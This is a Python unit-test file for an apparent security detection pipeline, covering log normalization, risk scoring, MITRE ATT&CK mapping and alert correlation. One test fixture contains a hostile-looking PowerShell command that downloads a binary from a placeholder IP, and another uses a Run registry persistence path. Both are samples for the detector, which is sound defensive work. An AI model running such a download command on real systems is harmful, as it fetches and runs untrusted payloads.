import unittest
from datetime import datetime, timezone

from app.correlation.engine import correlate_events
from app.detection.engine import DetectionEngine
from app.detection.scoring import calculate_risk, classify_risk
from app.ingestion.normalizer import normalize_record
from app.mitre.mapper import map_event_to_mitre
from app.main import app, health


class PipelineTests(unittest.TestCase):
    def test_health_endpoint_contract(self):
        self.assertEqual(health()["status"], "ok")
        self.assertIn("/api/health", {route.path for route in app.routes})

    def test_normalization_and_detection(self):
        event = normalize_record({
            "Id": 4104,
            "TimeCreated": "2026-01-01T10:00:00Z",
            "ProviderName": "PowerShell",
            "ScriptBlockText": "powershell -EncodedCommand Invoke-WebRequest https://203.0.113.50/a.bin",
        })
        result = DetectionEngine().analyze({**event, "raw_data": event["raw_data"]})
        self.assertEqual(event["timestamp"].tzinfo, timezone.utc)
        self.assertGreaterEqual(result["risk_score"], 45)
        self.assertIn("T1105", result["mitre_techniques"])

    def test_scoring_and_mapping(self):
        self.assertEqual(calculate_risk(100, 100), 100)
        self.assertEqual(classify_risk(90), ("CRITICAL", "Malicious"))
        mapped = map_event_to_mitre({"process_name": "powershell.exe", "registry_path": r"HKCU\CurrentVersion\Run"})
        self.assertEqual({x["id"] for x in mapped}, {"T1059.001", "T1547.001"})

    def test_correlation_groups_related_alerts(self):
        events = [{"id": i, "timestamp": datetime(2026, 1, 1, 10, 0, i, tzinfo=timezone.utc).isoformat(), "computer": "WIN-1"} for i in range(1, 4)]
        alerts = [{"event_id": i, "risk_score": 80, "title": "PowerShell activity detected"} for i in range(1, 4)]
        groups = correlate_events(events, alerts)
        self.assertEqual(len(groups), 1)
        self.assertEqual(groups[0]["event_db_ids"], [1, 2, 3])


if __name__ == "__main__":
    unittest.main()
